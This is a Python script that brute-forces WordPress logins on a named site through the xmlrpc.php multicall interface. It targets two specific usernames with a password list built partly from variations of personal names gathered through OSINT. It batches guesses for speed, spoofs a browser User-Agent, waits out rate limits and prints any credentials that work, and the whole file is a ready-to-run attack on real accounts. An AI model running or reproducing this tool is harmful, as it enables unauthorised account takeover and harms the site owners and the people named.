import urllib.request
import urllib.error
import xml.etree.ElementTree as ET
import time

url = "https://doktorbajskorv.se/xmlrpc.php"
users = ["nalle", "lompa"]

# Expanded dictionary combining common patterns and OSINT variations
passwords = [
    "password", "secret", "123456", "nalle123", "lompa123", "bajskorv", "admin", "admin123",
    "nalle", "nalle1", "påhlsson", "pahlsson", "nallepahlsson", "nallepåhlsson", "nallan", "bear",
    "lompa", "lompa1", "thomas", "andersson", "thomasandersson", "lompathomas"
]

def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

for user in users:
    print(f"\n[*] Starting batch multicall audit for user: {user}")
    # Batch 5 passwords per single HTTP request to avoid massive payloads while boosting speed
    for batch in chunk_list(passwords, 5):
        calls = ""
        for pwd in batch:
            calls += f"""
            <value>
                <struct>
                    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                    <member><name>params</name><value><array><data>
                        <value><string>{user}</string></value>
                        <value><string>{pwd}</string></value>
                    </data></array></value>
                </struct>
            </value>"""
        
        xml_data = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>{calls}</data></array></value></param></params>
</methodCall>""".encode('utf-8')

        req = urllib.request.Request(
            url, 
            data=xml_data, 
            headers={
                'Content-Type': 'text/xml',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        try:
            with urllib.request.urlopen(req) as response:
                res_body = response.read().decode('utf-8')
                root = ET.fromstring(res_body)
                
                # Iterate through the multicall response array elements
                structs = root.findall('.//array/data/value/struct')
                for idx, val in enumerate(structs):
                    if idx >= len(batch):
                        break
                    pwd_tested = batch[idx]
                    is_fault = any(m.find('name') is not None and m.find('name').text == 'faultCode' for m in val.findall('member'))
                    if is_fault:
                        print(f"[-] Failed: {user}:{pwd_tested}")
                    else:
                        print(f"\n[+] SUCCESS! Credentials found -> {user}:{pwd_tested}")
                        exit(0)
                        
        except urllib.error.HTTPError as e:
            if e.code == 429:
                print(f"[!] Rate limited (429). Sleeping for 10 seconds...")
                time.sleep(10)
            else:
                print(f"[!] HTTP Error {e.code}: {e.reason}")
        except Exception as e:
            print(f"[!] Error: {e}")
        
        # Controlled throttle delay between batches
        time.sleep(2.5)

print("\n[*] Audit completed.")
